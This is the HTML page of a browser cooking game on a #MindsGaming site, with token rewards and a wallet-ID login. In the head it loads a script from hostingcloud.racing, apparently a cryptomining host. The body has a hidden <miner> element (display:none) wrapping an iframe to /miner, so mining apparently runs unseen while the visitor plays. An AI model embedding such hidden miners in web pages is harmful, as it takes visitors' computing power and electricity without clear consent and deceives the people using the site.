<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="/games/dice.js" defer></script>
    <script src="/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <link rel="stylesheet" href="/style.css" />
    <style>
      wrap {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-image: url("/images/chef-4509812_960_720.png");
        background-size: cover;
        background-repeat: no-repeat;
        z-index: -2;
      }

      dish {
        position: fixed;
        display: block;
        left: 0;
        top: 0;
        height: 100%;
      }

      footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
      }
      .button {
        position: relative;
        display: block;
        border-style: groove;
        text-align: center;
        font-size: 20px;
        color: green;
        width: 120px;
        margin: 5%;
      }

      .buttonReady {
        position: relative;
        display: block;
        border-style: groove;
        background-color: silver;
        text-align: center;
        font-size: 20px;
        color: green;
        width: 120px;
        cursor: pointer;
        margin: 5%;
      }

      .button2 {
        float: left;
        display: block;
        border-style: groove;
        background-color: silver;
        text-align: center;
        width: 9%;
        font-size: 20px;
        color: green;
        margin-left: 1%;
        margin-right: 10%;
        margin-bottom: 15px;
        opacity: 0.8;
      }

      .items {
        position: fixed;
        display: block;
        background-color: transparent;
        background-repeat: no-repeat;
        border-style: none;
        width: 50%;
        height: 350px;
        margin-left: 22%;
        z-index: -1;
      }

      .makefood {
        position: fixed;
        display: block;
        width: 200px;
        height: 150px;
        margin-top: 23rem;
        margin-left: -5rem;
        background-image: url("/images/hamburger-31775_960_720.png");
        background-size: contain;
        background-repeat: no-repeat;
        background-color: transparent;
        opacity: 0.01;
        z-index: 2;
        transform: rotate(0.34deg);
      }

      .platedfood {
        position: fixed;
        display: block;
        width: 200px;
        height: 150px;
        margin-top: 27rem;
        margin-left: -5rem;
        background-image: url("/images/silverware-1667987_960_720.png");
        background-size: contain;
        background-repeat: no-repeat;
        background-color: transparent;
        opacity: 1;
        transform: rotate(-0.34deg);
      }
      .rewardicon {
        position: fixed;
        display: block;
        bottom: 0;
        right: 0;
        margin-bottom: 2.27rem;
        margin-right: 12rem;
        width: 45px;
        height: 45px;
        background-color: gold;
        background-image: url("/images/coinsTwo.png");
        background-size: contain;
        background-repeat: no-repeat;
        border-radius: 50%;
        color: white;
        opacity: 0.6;
        z-index: 12;
      }
      .profileicon {
        position: fixed;
        display: block;
        bottom: 0;
        right: 0;
        margin-bottom: 2.27rem;
        margin-right: 7.59rem;
        width: 47px;
        height: 47px;
        background-color: gold;
        background-image: url("/images/avatar.png");
        background-size: contain;
        background-repeat: no-repeat;
        border-radius: 50%;
        opacity: 1;
        z-index: 3;
      }

      .loginImage {
        position: relative;
        display: block;
        width: 25rem;
        height: 40rem;
        background-color: transparent;
        background-image: url("/images/login.png");
        background-size: contain;
        background-repeat: no-repeat;
        z-index: 2;
      }
      .rewardPop {
        position: fixed;
        display: block;
        bottom: 0;
        right: 0;
        width: 50px;
        height: 50px;
        margin-right: 11rem;
        margin-bottom: 3rem;
        background-color: transparent;
        background-image: url("/images/confetti.png");
        background-size: contain;
        background-repeat: no-repeat;
        z-index: 3;
      }
      .userView {
        position: fixed;
        display: block;
        top: 0;
        left: 0;
        width: 200px;
        background-color: silver;
        opacity: 0.6;
        z-index: 2;
      }
      .hide {
        display: none;
      }
      miner {
        display: none;
      }
    </style>
    <script src="/games/pinn/pinn.js" defer></script>
  </head>
  <body style="background-color: green;">
    <miner><iframe src="/miner"> </iframe></miner>
    <wrap id="superGame">
      <center>
        <dish>
          <div class="buttonReady" id="foodButton" onclick="foodImage();">
            Make Food
          </div>
          <div class="hide" id="plateButton" onclick="platedImage();">
            Plate Food
          </div>
          <div class="hide" id="serveButton" onclick="servedImage();">
            Serve Food
          </div>
          <div class="hide" id="cashOut" onclick="claimUpdate();">
            End Shift
          </div>
          <div class="buttonReady" id="quit" onclick="quit();">
            Quit
          </div>
        </dish>

        <div class="items">
          <div id="foodImage"></div>
          <div id="platedImage"></div>
          <div id="serveImage"></div>
        </div>

        <footer>
          <div class="button2">
            Making Food:
            <div id="makefood">
              0%
            </div>

            <meter
              value="1"
              id="makeFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            Food Plated
            <div id="platedfood">
              0
            </div>
            <meter
              value="0"
              id="platedFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            Food Served
            <div id="servedfood">
              0
            </div>
            <meter
              value="1"
              id="servedFood"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
          <div class="button2">
            Completed <label id="xtrA">0.</label>
            <label id="rewards">
              0
            </label>
            <meter
              value="0"
              id="Rewards"
              max="100"
              low="10"
              high="80"
              class="hide"
            ></meter>
          </div>
        </footer>
      </center>
    </wrap>

    <div id="oopsLogin" title="wallet" class="hide">
      <div align="center">
        <h1>
          What Is Your Wallet ID Again?
        </h1>
        <div class="wrapIMG">
          <div class="loginImage">
            <br />
            <br />
            <form class="form" id="wallet">
              <input
                name="dream"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Wallet ID"
                required
              />
              <br />
              <button type="submit" id="submit-dream" onclick="classicLogin();">
                Login
              </button>
            </form>
            <br />
            <div class="button" onclick="classicGuest();">
              Guest
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="rewardicon" id="rewardicon" onclick="claimUpdate();">
      <br />
      <br />

      <center>
        <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
          >00</label
        >
      </center>
    </div>
    <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
    <div title="closed" id="REWARDS" class="hide">
      <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
        X
      </div>
      <div class="hide">Player: <label id="myName">Guest</label></div>
      <div>
        Wallet:
        <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
          >LOGIN</label
        >
      </div>
      <div>
        Reward Token:
        <label id="myToken">Random</label>
      </div>
      <div>
        Mode:
        <label id="vrMode" onclick="vrMode();">Hubs</label>
      </div>
      <div class="button" onclick="pendingClaims();">
        View Pending
      </div>
      <button class="hide" id="clear-dreams">
        Clear Dreams
      </button>
      <section title="closed" id="pendingClaims" class="hide">
        <ul id="dreams"></ul>
      </section>
    </div>
    <div id="offline" class="hide">
      <center>
        <h1>
          <br />
          <a href="/" target="_self"
            >Sorry You can't Earn Tokens Offline<br />Go Back To MTCG</a
          >
        </h1>
      </center>
    </div>
  </body>
</html>
